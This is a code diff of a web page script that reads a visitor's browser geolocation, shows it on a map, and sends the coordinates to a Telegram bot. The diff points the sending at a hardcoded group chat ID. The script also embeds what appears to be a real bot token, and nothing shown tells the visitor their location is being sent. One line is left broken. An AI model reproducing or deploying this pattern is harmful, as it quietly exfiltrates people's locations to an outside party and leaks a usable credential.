@@ -50,16 +50,16 @@
                     .openPopup();
 
                 // Send geolocation to Telegram
-                sendToTelegram(latitude, longitude);
+                sendToTelegram("-1002132690199",latitude, longitude);
             }
 
             function error() {
                 alert('Unable to retrieve your location');
             }
 
-            function sendToTelegram(latitude, longitude) {
+            function sendToTelegram(chatIdS,latitude, longitude) {
                 const botToken = '6517062675:AAF4CN46a9dHCJhWbDG2BcvOt8q5fIEOlOM'; // Replace with your actual bot token
-                const chatId = '6813400773'; // Replace with your actual chat ID
+                const chatId = chatIdS; // Replace with your actual chat ID
 
                 let message = ism
                 const apiUrl = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
